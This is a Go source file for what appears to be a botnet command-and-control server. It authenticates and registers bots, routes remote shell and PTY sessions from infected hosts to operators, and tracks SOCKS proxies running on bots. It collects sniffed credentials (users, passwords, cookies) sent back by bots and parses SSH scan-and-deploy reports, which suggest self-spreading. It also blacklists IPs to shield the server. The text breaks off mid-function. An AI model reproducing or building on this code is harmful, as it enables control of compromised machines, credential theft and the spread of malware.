package main

import (
	"bufio"
	cryptoRand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/oschwald/maxminddb-golang"
)

// ============================================================================
// AUTH RATE LIMITER & IP BLACKLIST
// Tracks failed auth attempts per IP. Blocks IPs that exceed the threshold
// for a cooldown period, preventing challenge-flood DoS on the C2.
// Supports permanent IP blacklisting for persistent offenders.
// ============================================================================

const (
	authMaxFails    = 2                 // failures before temporary block
	authCooldown    = 180 * time.Minute // how long to temporarily block
	authCleanupRate = 5 * time.Minute   // stale entry cleanup interval

	// Permanent blacklist thresholds
	permBlacklistThreshold = 5            // number of temporary blocks before permanent blacklist
	permBlacklistDuration  = 0 * time.Hour // how long to keep IP in blacklist (0 = permanent)

	// Bot heartbeat timeout — bots not heard from in this duration are removed
	BotHeartbeatTimeout = 120 * time.Second
)

type authEntry struct {
	fails          int
	blockedUntil   time.Time
	tempBlockCount int // number of times this IP has been temporarily blocked
	firstSeen      time.Time
}

var (
	authLimiter     = make(map[string]*authEntry)
	authLimiterLock sync.Mutex

	// Permanent blacklist - stores timestamp when blacklist expires (time.Time{} for permanent)
	ipBlacklist   = make(map[string]time.Time)
	blacklistLock sync.RWMutex
)

// addToBlacklist adds an IP to the permanent blacklist
func addToBlacklist(ip string, duration time.Duration) {
	blacklistLock.Lock()
	defer blacklistLock.Unlock()

	expiry := time.Time{}
	if duration > 0 {
		expiry = time.Now().Add(duration)
	}
	ipBlacklist[ip] = expiry

	logMsg("[BLACKLIST] IP %s added to blacklist (expires: %v)", ip, expiry)
	PushActivity("blacklist", fmt.Sprintf("IP %s blacklisted", ip))
}

// isBlacklisted checks if an IP is in the permanent blacklist.
// Uses a write lock to safely clean up expired entries without lock upgrade races.
func isBlacklisted(ip string) bool {
	blacklistLock.Lock()
	defer blacklistLock.Unlock()

	expiry, exists := ipBlacklist[ip]
	if !exists {
		return false
	}

	// Check if blacklist entry has expired
	if !expiry.IsZero() && time.Now().After(expiry) {
		delete(ipBlacklist, ip)
		return false
	}

	return true
}

// authIsBlocked checks if an IP is currently blocked (temporary or permanent)
func authIsBlocked(ip string) bool {
	// Check permanent blacklist first
	if isBlacklisted(ip) {
		return true
	}

	authLimiterLock.Lock()
	defer authLimiterLock.Unlock()
	e, ok := authLimiter[ip]
	if !ok {
		return false
	}
	if time.Now().Before(e.blockedUntil) {
		return true
	}
	// Cooldown expired — if they were blocked, reset
	if e.fails >= authMaxFails {
		delete(authLimiter, ip)
	}
	return false
}

// authRecordFail records a failed auth attempt. Returns true if the IP is now blocked.
func authRecordFail(ip string) bool {
	// Check if already blacklisted
	if isBlacklisted(ip) {
		return true
	}

	authLimiterLock.Lock()
	defer authLimiterLock.Unlock()

	e, ok := authLimiter[ip]
	if !ok {
		e = &authEntry{
			firstSeen: time.Now(),
		}
		authLimiter[ip] = e
	}

	e.fails++

	// Check if this failure pushes them over the threshold
	if e.fails >= authMaxFails {
		e.blockedUntil = time.Now().Add(authCooldown)
		e.tempBlockCount++

		// Check if this IP should be permanently blacklisted
		if e.tempBlockCount >= permBlacklistThreshold {
			// Add to permanent blacklist
			addToBlacklist(ip, permBlacklistDuration)

			// Clean up temp entry since they're now permanently blacklisted
			delete(authLimiter, ip)

			logMsg("[BLACKLIST] IP %s permanently blacklisted after %d temporary blocks",
				ip, e.tempBlockCount)

			// Broadcast blacklist event
			PushActivity("blacklist", fmt.Sprintf("IP %s permanently blacklisted (%d failures)", ip, e.fails))
		}

		return true
	}

	logMsg("[RATELIMIT] IP %s auth failure #%d/%d", ip, e.fails, authMaxFails)
	return false
}

// authRecordSuccess clears the fail counter for an IP on successful auth.
func authRecordSuccess(ip string) {
	authLimiterLock.Lock()
	defer authLimiterLock.Unlock()

	// Don't remove if they're in the process of being blacklisted
	if e, ok := authLimiter[ip]; ok && e.tempBlockCount < permBlacklistThreshold {
		delete(authLimiter, ip)
	}
}

// authCleanup periodically removes stale entries from the limiter map.
func authCleanup() {
	for {
		time.Sleep(authCleanupRate)
		now := time.Now()

		// Clean up auth limiter entries
		authLimiterLock.Lock()
		for ip, e := range authLimiter {
			if now.After(e.blockedUntil) && e.fails < authMaxFails {
				delete(authLimiter, ip)
			} else if now.After(e.blockedUntil) {
				delete(authLimiter, ip)
			}
		}
		authLimiterLock.Unlock()

		// Clean up expired blacklist entries
		blacklistLock.Lock()
		for ip, expiry := range ipBlacklist {
			if !expiry.IsZero() && now.After(expiry) {
				delete(ipBlacklist, ip)
				logMsg("[BLACKLIST] IP %s removed from blacklist (expired)", ip)
			}
		}
		blacklistLock.Unlock()
	}
}

// getBlacklistStats returns statistics about the blacklist
func getBlacklistStats() map[string]interface{} {
	blacklistLock.RLock()
	defer blacklistLock.RUnlock()

	activeCount := 0
	expiringCount := 0

	for _, expiry := range ipBlacklist {
		if expiry.IsZero() {
			activeCount++
		} else {
			expiringCount++
		}
	}

	return map[string]interface{}{
		"total_blacklisted": len(ipBlacklist),
		"permanent":         activeCount,
		"temporary":         expiringCount,
	}
}

// getAuthLimiterStats returns statistics about the auth limiter
func getAuthLimiterStats() map[string]interface{} {
	authLimiterLock.Lock()
	defer authLimiterLock.Unlock()

	activeBlocks := 0
	pendingFailures := 0
	now := time.Now()

	for _, e := range authLimiter {
		if now.Before(e.blockedUntil) {
			activeBlocks++
		}
		if e.fails > 0 && e.fails < authMaxFails {
			pendingFailures++
		}
	}

	return map[string]interface{}{
		"active_blocks":    activeBlocks,
		"pending_failures": pendingFailures,
		"total_entries":    len(authLimiter),
	}
}

func init() {
	go authCleanup()
}

// ============================================================================
// EZF3 TRANSPORT
// Bot-to-CNC communication uses EZF3 (ChaCha20 + X25519 + HMAC-SHA256 over raw TCP).
// ============================================================================

// ============================================================================
// AUTHENTICATION FUNCTIONS
// These functions handle the challenge-response authentication between
// the CNC server and bots. Uses SHA-256 hashing with the magic code to verify
// that connecting bots are legitimate.
// ============================================================================

// generateAuthResponse creates a SHA-256-based authentication response
// Takes a random challenge string and the shared secret (magic code)
// Concatenates challenge + secret + challenge, then SHA-256 hashes it
// Returns Base64 encoded hash that must match the bot's response
// This ensures bots know the magic code without transmitting it in plaintext
func generateAuthResponse(challenge, secret string) string {
	h := sha256.New()
	h.Write([]byte(challenge + secret + challenge))
	response := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return response
}

// randomChallenge generates a random alphanumeric string for authentication
// Creates a unique challenge for each bot connection attempt
// Uses standard alphanumeric charset (a-z, A-Z, 0-9) for compatibility
// Length parameter determines challenge complexity (typically 32 chars)
// Each bot gets a different challenge preventing replay attacks
func randomChallenge(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	if _, err := cryptoRand.Read(b); err != nil {
		// Fallback to math/rand only if crypto/rand fails
		for i := range b {
			b[i] = charset[rand.Intn(len(charset))]
		}
		return string(b)
	}
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b)
}

// ============================================================================
// GEOIP LOOKUP
// Uses local MaxMind GeoLite2-Country mmdb database.
// Falls back to "??" if the database file is missing or lookup fails.
// ============================================================================

// geoReader is the cached mmdb reader (nil = not loaded / not available)
var (
	geoReader     *maxminddb.Reader
	geoReaderOnce sync.Once
)

// openGeoReader opens db/GeoLite2-Country.mmdb once.
func openGeoReader() {
	r, err := maxminddb.Open("db/GeoLite2-Country.mmdb")
	if err != nil {
		logMsg("[GEO] mmdb not available (place GeoLite2-Country.mmdb in db/): %v", err)
		return
	}
	geoReader = r
}

// geoCountry is the minimal struct to pull country ISO code from the mmdb.
type geoCountry struct {
	Country struct {
		ISOCode string `maxminddb:"iso_code"`
	} `maxminddb:"country"`
}

// lookupGeoIP resolves country code from an IP:port address string.
// Returns 2-letter country code (e.g., "US", "DE") or "??" on failure.
func lookupGeoIP(remoteAddr string) string {
	// Extract IP from IP:port
	host, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		host = remoteAddr
	}

	// Skip private/localhost IPs
	ip := net.ParseIP(host)
	if ip == nil || ip.IsLoopback() || ip.IsPrivate() {
		return "LO"
	}

	geoReaderOnce.Do(openGeoReader)
	if geoReader == nil {
		return "??"
	}

	var result geoCountry
	if err := geoReader.Lookup(ip, &result); err != nil {
		logMsg("[GEO] Lookup failed for %s: %v", host, err)
		return "??"
	}

	code := result.Country.ISOCode
	if code == "" {
		return "??"
	}

	logMsg("[GEO] %s -> %s", host, code)
	return code
}

// ============================================================================
// BOT MANAGEMENT FUNCTIONS
// These functions manage the lifecycle of bot connections including
// registration, removal, cleanup, and tracking of bot metadata.
// Thread-safe operations using RWMutex for concurrent access.
// ============================================================================

// addBotConnection registers a newly authenticated bot in the connections map
// Handles duplicate bot IDs by closing the old connection (prevents stale entries)
// Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
// Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
// Maintains both new map-based storage and legacy slice for backwards compatibility
func addBotConnection(conn *CipherConn, botID string, arch string, ram int64, cpuCores int, processName string, origin string, country string, hasScanner bool, hasAttack bool) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	// Check for duplicates - if same bot reconnects, close old socket
	isDuplicate := false
	if existing, exists := botConnections[botID]; exists {
		isDuplicate = true
		if existing.conn != nil {
			existing.conn.Close()
		}
		logMsg("[☾℣☽] Replacing duplicate bot connection: %s (%s)", botID, conn.RemoteAddr())
	}

	botConn := &BotConnection{
		conn:          conn,
		botID:         botID,
		connectedAt:   time.Now(),
		lastPing:      time.Now(),
		authenticated: true,
		arch:          arch,
		ip:            conn.RemoteAddr().String(),
		ram:           ram,
		cpuCores:      cpuCores,
		processName:   processName,
		origin:        origin,
		country:       country,
		group:         getBotGroup(botID),
		userConn:      nil,
		hasScanner:    hasScanner,
		hasAttack:     hasAttack,
	}

	// Auto-group by origin if no group already set and origin isn't "direct"
	if botConn.group == "" && origin != "direct" && origin != "" {
		setBotGroup(botID, origin)
		botConn.group = origin
	}

	botConnections[botID] = botConn
	if !isDuplicate {
		botCount++
	}

	// Notify TUI of connection
	LogBotConnection(arch, true)

	// Activity log for web panel
	PushActivity("connect", fmt.Sprintf("%s connected — %s %s %dMB", botID, arch, country, ram))

	// SSE broadcast
	BroadcastBotConnect(botConn)

	// Dispatch persistent tasks to newly connected bot
	go dispatchTasksToBot(botID, conn)

	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | Proc: %s | Origin: %s | Country: %s | IP: %s | Total: %d",
		botID, arch, ram, cpuCores, processName, origin, country, conn.RemoteAddr(), botCount)
}

// removeBotConnection cleanly removes a bot from all tracking structures
// Closes the network connection to free up system resources
// Removes from main connections map and decrements global bot count
// Also cleans up the command origin map (tracks which user sent commands)
// Removes from legacy botConns slice for backwards compatibility
// Thread-safe with mutex locking for both maps
func removeBotConnection(botID string) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	if botConn, exists := botConnections[botID]; exists {
		arch := botConn.arch
		botConn.conn.Close()
		delete(botConnections, botID)
		botCount--

		// Notify TUI of disconnection
		LogBotConnection(arch, false)

		// Activity log for web panel
		PushActivity("disconnect", fmt.Sprintf("%s disconnected — %s", botID, arch))

		// SSE broadcast
		BroadcastBotDisconnect(botID)

		// Remove from command origin map (tracks user->bot command routing)
		originLock.Lock()
		delete(commandOrigin, botID)
		originLock.Unlock()

	}
}

// cleanupDeadBots runs as a background goroutine to remove stale connections
// Checks every 15 seconds for bots that haven't sent a PONG in 120 seconds
// Dead bots can occur from network issues, bot crashes, or firewall blocks
// Prevents resource leaks from accumulating zombie connections over time
// Logs cleanup activity for monitoring and debugging purposes
func cleanupDeadBots() {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		botConnsLock.Lock()
		now := time.Now()

		type deadBot struct {
			id   string
			arch string
		}
		var deadBots []deadBot

		// Scan all bots and check last ping timestamp
		for botID, botConn := range botConnections {
			if now.Sub(botConn.lastPing) > BotHeartbeatTimeout {
				deadBots = append(deadBots, deadBot{id: botID, arch: botConn.arch})
				logMsg("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)",
					botID, now.Sub(botConn.lastPing))
			}
		}

		for _, db := range deadBots {
			if botConn, exists := botConnections[db.id]; exists {
				botConn.conn.Close()
				delete(botConnections, db.id)
				botCount--
			}
		}
		botConnsLock.Unlock()

		// Broadcast disconnects outside the lock
		for _, db := range deadBots {
			LogBotConnection(db.arch, false)
			PushActivity("disconnect", fmt.Sprintf("%s disconnected — %s (timeout)", db.id, db.arch))
			BroadcastBotDisconnect(db.id)

			originLock.Lock()
			delete(commandOrigin, db.id)
			originLock.Unlock()
		}

		if len(deadBots) > 0 {
			logMsg("[CLEANUP] Removed %d dead bots | Total alive: %d", len(deadBots), botCount)
		}
	}
}

// ============================================================================
// DUPLICATE DETECTION
// Before wasting a challenge/HMAC on a new connection, check if a bot from
// the same IP is already registered.  If so, stall — the new instance should
// be killing the old one via the control port.  If the old session never
// drops, it's a bugged duplicate and we close the newcomer.
// Cost: one RLock map scan, zero extra allocations.
// ============================================================================

// botExistsForIP returns true if any authenticated bot is connected from ip.
func botExistsForIP(ip string) bool {
	return botIDForIP(ip) != ""
}

// botIDForIP returns the botID of an existing connection from ip, or "".
func botIDForIP(ip string) string {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	for id, bc := range botConnections {
		bcIP := bc.ip
		if h, _, err := net.SplitHostPort(bcIP); err == nil {
			bcIP = h
		}
		if bcIP == ip {
			return id
		}
	}
	return ""
}

// kickBot sends !exit to a bot and tears down its session.
func kickBot(botID string) {
	botConnsLock.Lock()
	bc, exists := botConnections[botID]
	if !exists {
		botConnsLock.Unlock()
		return
	}
	// Send !exit — lightweight process kill, persistence stays intact
	bc.conn.WriteFrame([]byte("!exit\n")) //nolint:errcheck
	bc.conn.Close()
	delete(botConnections, botID)
	botCount--
	arch := bc.arch
	botConnsLock.Unlock()

	LogBotConnection(arch, false)
	PushActivity("disconnect", fmt.Sprintf("%s kicked — stale duplicate", botID))
	BroadcastBotDisconnect(botID)

	originLock.Lock()
	delete(commandOrigin, botID)
	originLock.Unlock()
}

// ============================================================================
// BOT CONNECTION HANDLER
// Main function that handles the entire lifecycle of a bot connection:
// 1. Duplicate-IP stall (wait for old instance to die via control port)
// 2. Challenge-response authentication to verify bot legitimacy
// 3. Protocol version verification for compatibility
// 4. Bot registration with metadata (ID, arch, RAM)
// 5. Continuous command loop for receiving bot responses and pings
// 6. Cleanup on disconnect to free resources
// ============================================================================

// handleBotConnection manages authentication and command routing for a single bot
// Runs as a goroutine for each incoming bot connection
// Implements the full authentication handshake protocol
// Routes shell command output back to the user who issued the command
// Handles Base64-encoded output for binary-safe transmission
// handleBotConnection manages authentication and command routing for a single bot
// Runs as a goroutine for each incoming bot connection
// Implements the full authentication handshake protocol
// Routes shell command output back to the user who issued the command
// Handles Base64-encoded output for binary-safe transmission
func handleBotConnection(cc *CipherConn) {
	conn := cc // net.Conn interface for Close/deadline calls
	// Extract IP for rate limiting (strip port)
	remoteIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(remoteIP); err == nil {
		remoteIP = host
	}

	// Check rate limit before doing any work
	if authIsBlocked(remoteIP) {

		conn.Close()
		return
	}

	// Stall if a bot from this IP is already connected.
	// The new instance should be killing the old one via the control port.
	// Wait a few seconds for the old session to drop naturally.
	// If it doesn't, send !exit to the old bot to force it out.
	if botExistsForIP(remoteIP) {
		// Give the control-port EXIT a chance to work
		for i := 0; i < 5; i++ {
			time.Sleep(1 * time.Second)
			if !botExistsForIP(remoteIP) {
				break
			}
		}

		// Still there — kick the old session via !exit
		if oldID := botIDForIP(remoteIP); oldID != "" {
			logMsg("[AUTH] Old instance %s from %s stuck — sending !exit to free slot", oldID, remoteIP)
			kickBot(oldID)

			// Brief wait for the kicked session to tear down
			for i := 0; i < 5; i++ {
				time.Sleep(500 * time.Millisecond)
				if !botExistsForIP(remoteIP) {
					break
				}
			}
		}

		if botExistsForIP(remoteIP) {
			logMsg("[AUTH] Old instance from %s still alive after !exit — proceeding anyway", remoteIP)
		} else {
			logMsg("[AUTH] Old instance from %s cleared, proceeding with new connection", remoteIP)
		}
	}

	defer func() {
		// Cleanup: Find and remove bot from connections map on disconnect
		botConnsLock.Lock()
		var disconnectedID, disconnectedArch string
		for botID, botConn := range botConnections {
			if botConn.conn == cc {
				disconnectedID = botID
				disconnectedArch = botConn.arch
				delete(botConnections, botID)
				botCount--
				logMsg("[☾℣☽] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
				break
			}
		}
		botConnsLock.Unlock()

		// Broadcast disconnect to web panel SSE clients
		if disconnectedID != "" {
			LogBotConnection(disconnectedArch, false)
			PushActivity("disconnect", fmt.Sprintf("%s disconnected — %s", disconnectedID, disconnectedArch))
			BroadcastBotDisconnect(disconnectedID)

			originLock.Lock()
			delete(commandOrigin, disconnectedID)
			originLock.Unlock()
		}

		conn.Close()
	}()

	// Step 1: Send authentication challenge
	challenge := randomChallenge(32)
	if err := cc.WriteFrame([]byte(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge))); err != nil {
		return
	}

	// Check if IP got blocked while sending challenge
	if authIsBlocked(remoteIP) {
		logMsg("[BLOCKED] IP %s blocked after sending challenge", remoteIP)
		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
		conn.Close()
		return
	}

	// Step 2: Read bot's response
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	authRespChan := make(chan string, 1)
	authErrChan := make(chan error, 1)

	go func() {
		payload, err := cc.ReadFrame()
		if err != nil {
			authErrChan <- err
			return
		}
		authRespChan <- strings.TrimSpace(string(payload))
	}()

	var authResponse string
	var err error
	select {
	case authResponse = <-authRespChan:
	case err = <-authErrChan:
		_ = err
		authRecordFail(remoteIP)
		return
	case <-time.After(15 * time.Second):
		authRecordFail(remoteIP)
		return
	}

	if authIsBlocked(remoteIP) {
		logMsg("[BLOCKED] IP %s blocked during auth handshake", remoteIP)
		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
		conn.Close()
		return
	}

	// Step 3: Verify response
	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
	if authResponse != expectedResponse {
		blocked := authRecordFail(remoteIP)
		logMsg("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...",
			conn.RemoteAddr(),
			safeSubstring(authResponse, 0, 10),
			safeSubstring(expectedResponse, 0, 10))
		if blocked {
			logMsg("[RATELIMIT] Rate-limited %s after %d failures", remoteIP, authMaxFails)
			cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
		} else {
			cc.WriteFrame([]byte("AUTH_FAILED\n")) //nolint:errcheck
		}
		return
	}

	if authIsBlocked(remoteIP) {
		logMsg("[BLOCKED] IP %s blocked during verification", remoteIP)
		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
		conn.Close()
		return
	}

	// Step 4: Send success
	authRecordSuccess(remoteIP)
	if err := cc.WriteFrame([]byte("AUTH_SUCCESS\n")); err != nil {
		return
	}

	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())

	// Step 5: Wait for bot registration
	conn.SetReadDeadline(time.Now().Add(25 * time.Second))

	regRespChan := make(chan string, 1)
	regErrChan := make(chan error, 1)

	go func() {
		payload, err := cc.ReadFrame()
		if err != nil {
			regErrChan <- err
			return
		}
		regRespChan <- strings.TrimSpace(string(payload))
	}()

	var registerMsg string
	select {
	case registerMsg = <-regRespChan:
	case err = <-regErrChan:
		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
		return
	case <-time.After(25 * time.Second):
		logMsg("[AUTH] Timeout reading registration from %s", conn.RemoteAddr())
		return
	}

	// Check if IP was blocked during registration
	if authIsBlocked(remoteIP) {
		logMsg("[BLOCKED] IP %s blocked during registration", remoteIP)
		conn.Close()
		return
	}

	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
	if !strings.HasPrefix(registerMsg, "REGISTER:") {
		logMsg("[AUTH] Invalid registration format from %s: %s", conn.RemoteAddr(), registerMsg)
		return
	}

	parts := strings.Split(registerMsg, ":")
	if len(parts) < 3 {
		logMsg("[AUTH] Malformed registration from %s: %s", conn.RemoteAddr(), registerMsg)
		return
	}

	version := parts[1]
	botID := parts[2]
	arch := "unknown"
	if len(parts) > 3 {
		arch = parts[3]
	}
	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram:cpu:procname
	var ram int64 = 0
	if len(parts) > 4 {
		fmt.Sscanf(parts[4], "%d", &ram)
	}
	// Parse CPU cores
	var cpuCores int = 0
	if len(parts) > 5 {
		fmt.Sscanf(parts[5], "%d", &cpuCores)
	}
	// Parse process name
	processName := "unknown"
	if len(parts) > 6 {
		processName = parts[6]
	}
	// Parse origin tag (how this bot was recruited)
	origin := "direct"
	if len(parts) > 7 {
		origin = parts[7]
	}
	// Parse scanner capability flag
	hasScanner := true
	if len(parts) > 8 && parts[8] == "noscan" {
		hasScanner = false
	}
	// Parse attack capability flag
	hasAttack := true
	if len(parts) > 9 && parts[9] == "noatk" {
		hasAttack = false
	}

	// Final block check before adding bot
	if authIsBlocked(remoteIP) {
		logMsg("[BLOCKED] IP %s blocked before bot registration", remoteIP)
		conn.Close()
		return
	}

	// GeoIP lookup from bot's IP
	country := lookupGeoIP(conn.RemoteAddr().String())

	// Your existing version check
	if version != PROTOCOL_VERSION {
		logMsg("[AUTH] Version mismatch from %s: got %s, expected %s",
			conn.RemoteAddr(), version, PROTOCOL_VERSION)
		return
	}

	// Add bot to connections
	addBotConnection(cc, botID, arch, ram, cpuCores, processName, origin, country, hasScanner, hasAttack)

	// Reset deadline for normal operation
	conn.SetDeadline(time.Time{})

	// Send first PING immediately on registration
	cc.WriteFrame([]byte("PING\n")) //nolint:errcheck

	// Ping goroutine
	stopPing := make(chan struct{})
	defer close(stopPing)
	go func() {
		for {
			delay := time.Duration(16+rand.Intn(25)) * time.Second
			select {
			case <-time.After(delay):
				if authIsBlocked(remoteIP) {
					return
				}
				if err := cc.WriteFrame([]byte("PING\n")); err != nil {
					return
				}
			case <-stopPing:
				return
			}
		}
	}()

	deadTimeout := BotHeartbeatTimeout

	for {
		conn.SetReadDeadline(time.Now().Add(deadTimeout))
		payload, err := cc.ReadFrame()
		if err != nil {
			break
		}

		line := strings.TrimSpace(string(payload))

		// Any data from bot = bot is alive — update lastPing for cleanup scanner + web panel
		botConnsLock.Lock()
		if botConn, exists := botConnections[botID]; exists {
			botConn.lastPing = time.Now()
		}
		botConnsLock.Unlock()

		if line == "PONG" {
			continue
		}

		// Handle Base64 encoded output from shell commands
		if strings.HasPrefix(line, "OUTPUT_B64:") {
			// Extract the Base64 string
			b64Str := strings.TrimPrefix(line, "OUTPUT_B64:")
			b64Str = strings.TrimSpace(b64Str)

			// Decode Base64
			decoded, err := base64.StdEncoding.DecodeString(b64Str)
			if err != nil {
				logMsg("[BOT-%s] Failed to decode Base64 output: %v", botID, err)
			} else {
				// Format the decoded output nicely
				output := string(decoded)

				// Forward to TUI if active
				if tuiMode && tuiProgram != nil {
					tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: output})
				}

				// Check if we should forward this to a user
				originLock.Lock()
				userConn, hasUser := commandOrigin[botID]
				if hasUser && userConn != nil {
					delete(commandOrigin, botID)
				}
				originLock.Unlock()

				if hasUser && userConn != nil {
					forwardBotResponseToUser(botID, output, userConn)
				}

				// Forward to web shell connections
				forwardBotOutputToWebShells(botID, output)
			}
			continue
		}

		// Track SOCKS proxy state from bot messages
		if strings.HasPrefix(line, "[socks] started on ") {
			relay := strings.TrimPrefix(line, "[socks] started on ")
			botConnsLock.Lock()
			if bc, ok := botConnections[botID]; ok {
				bc.socksActive = true
				bc.socksRelay = relay
				bc.socksStarted = time.Now()
				BroadcastSocksUpdate(bc)
			}
			botConnsLock.Unlock()
			PushActivity("socks", fmt.Sprintf("SOCKS started on %s → %s", botID, relay))
			continue
		} else if line == "[socks] proxy stopped" {
			botConnsLock.Lock()
			if bc, ok := botConnections[botID]; ok {
				bc.socksActive = false
				bc.socksRelay = ""
				bc.socksUser = ""
				BroadcastSocksUpdate(bc)
			}
			botConnsLock.Unlock()
			PushActivity("socks", fmt.Sprintf("SOCKS stopped on %s", botID))
			continue
		} else if strings.HasPrefix(line, "[socks] relay disconnected ") {
			relay := strings.TrimPrefix(line, "[socks] relay disconnected ")
			botConnsLock.Lock()
			if bc, ok := botConnections[botID]; ok {
				bc.socksActive = false
				BroadcastSocksUpdate(bc)
			}
			botConnsLock.Unlock()
			PushActivity("socks", fmt.Sprintf("SOCKS relay disconnected %s → %s (reconnecting)", botID, relay))
			continue
		} else if strings.HasPrefix(line, "[socks] auth set ") {
			authPair := strings.TrimPrefix(line, "[socks] auth set ")
			if idx := strings.Index(authPair, ":"); idx > 0 {
				botConnsLock.Lock()
				if bc, ok := botConnections[botID]; ok {
					bc.socksUser = authPair[:idx]
				}
				botConnsLock.Unlock()
			}
			continue
		}

		// Binary scan report protocol (compact TLV frames, base64-wrapped)
		if strings.HasPrefix(line, "SR:") {
			b64 := strings.TrimPrefix(line, "SR:")
			if binData, err := base64.StdEncoding.DecodeString(b64); err == nil {
				parseScanReport(botID, binData)
			} else {
				logMsg("[BOT-%s] SR decode error: %v (len=%d)", botID, err, len(b64))
			}
			continue
		}

		// Sniffer stats — lightweight counters from child process pipe
		if strings.HasPrefix(line, "SNIFF|") {
			sniffJSON, _ := json.Marshal(map[string]string{
				"botID": botID,
				"raw":   line,
			})
			broadcastSSE("sniff_stats", string(sniffJSON))
			continue
		}

		// Sniffer hit — actual credential data exfiltrated from bot
		// Format: SNIFF_HIT|type|src_ip|dst_ip:port|user|pass
		if strings.HasPrefix(line, "SNIFF_HIT|") {
			parts := strings.SplitN(line, "|", 6)
			if len(parts) >= 6 {
				sniffType := parts[1] // post, basic, cookie, url
				srcIP := parts[2]
				// parts[3] is dst_ip:port — use srcIP for recording
				user := parts[4]
				pass := parts[5]
				RecordSniffHit(srcIP, sniffType, user, pass, botID)
			}
			continue
		}

		// Check if a preview collector is waiting for this bot's output
		previewCollectorsLock.Lock()
		if ch, ok := previewCollectors[botID]; ok {
			select {
			case ch <- line:
			default:
			}
			delete(previewCollectors, botID)
		}
		previewCollectorsLock.Unlock()

		// Check if we should forward this to a user
		originLock.Lock()
		userConn, hasUser := commandOrigin[botID]
		if hasUser && userConn != nil {
			delete(commandOrigin, botID)
		}
		originLock.Unlock()

		if hasUser && userConn != nil {
			userConn.Write([]byte(fmt.Sprintf("[Bot: %s] %s\r\n", botID, line)))
		}

		// Forward to web shell connections — detect PTY and streaming protocol lines
		if strings.HasPrefix(line, "PTY_DATA ") {
			// Raw PTY output — forward binary data after prefix
			raw := line[9:] // skip "PTY_DATA "
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "pty_output", "botID": botID, "data": raw,
			})
			continue
		} else if line == "PTY_OPENED" {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "pty_opened", "botID": botID,
			})
			continue
		} else if line == "PTY_CLOSED" {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "pty_closed", "botID": botID,
			})
			continue
		} else if line == "PTY_ALREADY_OPEN" {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "pty_opened", "botID": botID,
			})
			continue
		} else if strings.HasPrefix(line, "PTY_ERROR ") {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "pty_error", "botID": botID,
				"error": strings.TrimPrefix(line, "PTY_ERROR "),
			})
			continue
		}

		if strings.HasPrefix(line, "STDOUT ") {
			text := strings.TrimPrefix(line, "STDOUT ")
			// Forward to TUI
			if tuiMode && tuiProgram != nil {
				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
			}
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "stream_stdout", "botID": botID, "output": text + "\n",
			})
		} else if strings.HasPrefix(line, "STDERR ") {
			text := strings.TrimPrefix(line, "STDERR ")
			if tuiMode && tuiProgram != nil {
				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
			}
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "stream_stderr", "botID": botID, "output": text + "\n",
			})
		} else if line == "EXIT_OK command completed successfully" {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "stream_done", "botID": botID, "exitCode": 0,
			})
		} else if strings.HasPrefix(line, "EXIT_ERR ") {
			errMsg := strings.TrimPrefix(line, "EXIT_ERR ")
			if tuiMode && tuiProgram != nil {
				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: "[" + errMsg + "]\n"})
			}
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "stream_done", "botID": botID, "exitCode": 1,
				"error": errMsg,
			})
		} else if line == "[stream] output:" {
			sendWebShellStreamMsg(botID, map[string]interface{}{
				"type": "stream_start", "botID": botID,
			})
		} else {
			forwardBotOutputToWebShells(botID, line)
		}
	}
}

// ============================================================================
// BINARY SCAN REPORT PARSER
// Decodes compact TLV frames from "SR:" lines sent by scanner children.
// See bot/headers/scan_report.h for protocol spec.
// ============================================================================

const (
	srSSHHit        = 0x01
	srSSHDeployed   = 0x02
	srSSHDeployFail = 0x03
	srSSHProgress   = 0x04
	srSSHDone       = 0x05
	srHTTPHit       = 0x10
	srHTTPDone      = 0x11
)

func parseScanReport(botID string, data []byte) {
	pos := 0
	for pos+3 <= len(data) {
		msgType := data[pos]
